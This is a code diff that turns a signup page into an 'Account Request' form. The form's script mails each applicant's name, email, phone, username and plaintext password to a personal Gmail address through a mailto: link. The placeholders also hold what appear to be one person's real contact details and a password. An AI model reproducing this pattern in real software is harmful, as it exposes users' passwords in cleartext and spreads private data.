@@ -160,48 +160,44 @@
   <div class="signup-container">
     <div class="signup-header">
       <i class="fas fa-user-plus"></i>
-      <h2>Create Your Account</h2>
-      <p>Join our premium services today</p>
+      <h2>Account Request</h2>
+      <p>Submit your details for account creation</p>
     </div>
 
     <form class="signup-form" id="signupForm">
       <div class="input-group">
         <label for="fullname">Full Name</label>
-        <input type="text" id="fullname" placeholder="Enter your full name" required>
+        <input type="text" id="fullname" placeholder="Shahan Ali" required>
       </div>
 
       <div class="input-group">
         <label for="email">Email Address</label>
-        <input type="email" id="email" placeholder="example@domain.com" required>
+        <input type="email" id="email" placeholder="shahan8687@gmail.com" required>
       </div>
 
       <div class="input-group">
         <label for="phone">Phone Number</label>
-        <input type="tel" id="phone" placeholder="Enter your phone number" required>
+        <input type="tel" id="phone" placeholder="923027598014" required>
       </div>
 
       <div class="input-group">
-        <label for="username">Choose Username</label>
-        <input type="text" id="username" placeholder="Create a username" required>
+        <label for="username">Desired Username</label>
+        <input type="text" id="username" placeholder="shahan" required>
       </div>
 
       <div class="input-group">
-        <label for="password">Create Password</label>
-        <input type="password" id="password" placeholder="Enter a strong password" required>
+        <label for="password">Desired Password</label>
+        <input type="password" id="password" placeholder="shahan315" required>
       </div>
 
       <button type="submit" class="signup-btn">
-        <i class="fas fa-user-check"></i> Sign Up
+        <i class="fas fa-paper-plane"></i> Submit Request
       </button>
-
-      <div class="login-link">
-        Already have an account? <a href="#">Log in</a>
-      </div>
     </form>
   </div>
 
   <footer>
-    <p>мα∂є ву <b>ProBoy</b> &copy; <span id="currentYear"></span> | All rights reserved</p>
+    <p>мα∂є ву <b>ProBoy</b> &copy; <span id="currentYear"></span></p>
   </footer>
 
   <!-- Particles.js for background -->
@@ -279,14 +275,23 @@
         password: document.getElementById('password').value
       };
       
-      // Here you would typically send this to your server
-      console.log('Signup data:', formData);
+      // Create email body
+      const emailBody = `New Account Request:\n\n` +
+                       `Full Name: ${formData.fullname}\n` +
+                       `Email: ${formData.email}\n` +
+                       `Phone: ${formData.phone}\n` +
+                       `Username: ${formData.username}\n` +
+                       `Password: ${formData.password}\n\n` +
+                       `Please create this account manually.`;
       
-      // Show success message (in a real app, you'd redirect or show proper feedback)
-      alert(`Thank you for signing up, ${formData.fullname}!\nWe've sent a verification link to ${formData.email}`);
+      // Encode for URL
+      const encodedBody = encodeURIComponent(emailBody);
       
-      // Reset form
-      this.reset();
+      // Redirect to Gmail with pre-filled email
+      window.location.href = `mailto:luciferkiller315@gmail.com?subject=Account%20Request&body=${encodedBody}`;
+      
+      // Optional: Show confirmation
+      alert("Redirecting to email... Please send the pre-filled message to complete your request.");
     });
   </script>
 </body>
